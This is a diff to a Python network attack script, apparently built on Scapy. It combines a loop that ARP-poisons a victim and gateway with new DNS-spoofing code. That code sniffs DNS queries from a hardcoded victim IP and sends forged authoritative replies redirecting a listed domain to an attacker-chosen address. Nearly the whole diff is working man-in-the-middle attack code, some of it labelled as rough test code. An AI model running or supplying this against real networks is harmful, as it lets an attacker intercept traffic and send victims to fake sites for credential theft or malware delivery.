@@ -8,6 +8,41 @@ import os
 import socket
 import argparse
 
+domain = None
+spoof_ip = "104.21.18.235"
+sniff_filter = "udp dst port 53"
+victim_ip = "10.0.123.5"
+registers = {"example.com"}
+
+#Dictionary with console color codes to print text
+colors = {'HEADER' : "\033[95m",
+    'OKBLUE' : "\033[94m",
+    'RED' : "\033[91m",
+    'OKYELLOW' : "\033[93m",
+    'GREEN' : "\033[92m",
+    'LIGHTBLUE' : "\033[96m",
+    'WARNING' : "\033[93m",
+    'FAIL' : "\033[91m",
+    'ENDC' : "\033[0m",
+    'BOLD' : "\033[1m",
+    'UNDERLINE' : "\033[4m" }
+
+def valid_ip(address):
+    try: 
+        socket.inet_aton(address)
+        return True
+    except:
+        return False
+    
+def check_local_ip():
+    local_ip = os.popen("ip route | grep 'src' | awk {'print $9'}").read().strip()
+    while True:
+        if(valid_ip(local_ip)): break
+        else: local_ip = input(colors['WARNING']+"    [!] Cannot get your local IP addres, please write it: "+colors['ENDC']).strip()
+    return local_ip
+
+local_ip = check_local_ip()
+
 def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
     """
     Function to send ARP spoofing packets to the victim and the gateway.
@@ -35,6 +70,11 @@ def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, int
         send(gateway_arp_response, iface=interface, verbose=False)
         print("ARP poison sent: [Gateway IP: %s | Spoofed as Victim IP: %s]" % (gateway_ip, victim_ip))
 
+        # TEST CODE
+        print("Sniffing...")
+        sniff(prn=fake_dns_response, filter=sniff_filter, store=0, iface="enp0s10")
+
+        print("Do I enter here?")
     except Exception as e:
         print("Failed to send ARP poison: %s" % str(e))
 
@@ -63,7 +103,7 @@ def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
     except Exception as e:
         print("Failed to restore network: %s" % str(e))
 
-def run(args, stop_event):
+def run(args):
     """
     Function to run the ARP poisoning attack.
     
@@ -92,13 +132,85 @@ def run(args, stop_event):
         if not args.attacker_mac:
             print("Failed to find MAC address for attacker interface: {}".format(args.interface))
             return
+    
+    # ALL JANKY TEST CODE
+    # NEEDS TO BE REFORMATTED
    
     enable_ip_forwarding()
+    stop_event = threading.Event()
+    arp_poison_thread = threading.Thread(target=arp_poison_loop, args=(args, stop_event))
+    arp_poison_thread.start()
 
+    # Start the dns spoof #TEST
+    #start_spoof()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("Stopping ARP poisoning and restoring network...")
+        stop_event.set()
+        arp_poison_thread.join()
+        restore_network(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.interface)
+        disable_ip_forwarding()
+
+def arp_poison_loop(args, stop_event):
     while not stop_event.is_set():
         poison_arp(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac, args.interface)
-        time.sleep(1)
-    print("Stopping ARP poisoning and restoring network...")
-    restore_network(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.interface)
-    disable_ip_forwarding()
+        time.sleep(2)
+
+def poison_gateway_router(args):
+    """
+    Function to poison the gateway router and the victim's ARP tables.
+
+    Parameters:
+    victim_ip (str): IP address of the victim's machine.
+    victim_mac (str): MAC address of the victim's machine.
+    attacker_mac (str): MAC address of the attacker's machine.
+    interface (str): Network interface to use for sending ARP packets.
+
+    Outputs:
+    - Sends ARP spoofing packets to the victim and the gateway router.
+    - Prints status messages indicating success or failure of the ARP poison.
+
+    Alternative Outputs:
+    - Prints an error message if packet sending fails.
+    """
+    try:
+        global domain, spoof_ip
+        domain = args.domain
+        #spoof_ip = args.spoof_ip
+
+        gateway_ip = get_gateway_ip.find_gateway_ip()
+        gateway_mac = get_mac_address(gateway_ip)
+        argsnew = argparse.Namespace()
+        argsnew.victim_ip = args.victim_ip 
+        argsnew.victim_mac = args.victim_mac
+        argsnew.gateway_ip = gateway_ip
+        argsnew.gateway_mac = gateway_mac  
+        argsnew.attacker_mac = args.attacker_mac
+        argsnew.interface = args.interface
+        run(argsnew)
+    except Exception as e:
+        print("Failed to poison gateway router: %s" % str(e))
+
+def check_victims(pkt):
+    print("Received packet...")
+    if(IP in pkt): 
+        result = (pkt[IP].src == victim_ip)
+        print("From victim...")
+    else: 
+        result = False
+        print("Not from victim...")
+    print("Result: ", result)
+    return result  
+
+def fake_dns_response(pkt):
+    result = check_victims(pkt)
+    print("Smthng: {}".format(str(pkt[DNSQR].qname)[0:len(str(pkt[DNSQR].qname))-1]))
+    if (result and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[DNSQR].qname)[0:len(str(pkt[DNSQR].qname))-1] in registers):
+        cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
+        fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=spoof_ip) / DNSRR(rrname=pkt[DNSQR].qname,rdata=spoof_ip))
+        send(fakeResponse, verbose=0)
+        print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+pkt[IP].src+"]"+colors['WARNING']+": Redirecting "+colors['ENDC']+"["+cap_domain+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+spoof_ip+"]")
 
